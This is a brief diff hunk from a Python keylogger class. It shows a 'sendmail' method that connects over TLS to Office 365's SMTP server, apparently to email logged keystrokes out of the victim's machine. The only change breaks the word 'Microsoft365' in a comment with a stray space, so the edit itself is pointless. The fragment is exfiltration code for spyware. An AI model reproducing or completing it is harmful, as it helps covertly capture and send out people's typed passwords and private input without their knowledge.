@@ -80,7 +80,7 @@ class Keylogger:
 
     def sendmail(self, email, password, message, verbose=1):
         # manages a connection to an SMTP server
-        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
+        # in our case it's for Microsof t365, Outlook, Hotmail, and live.com
         server = smtplib.SMTP(host="smtp.office365.com", port=587)
         # connect to the SMTP server as TLS mode ( for security )
         server.starttls()
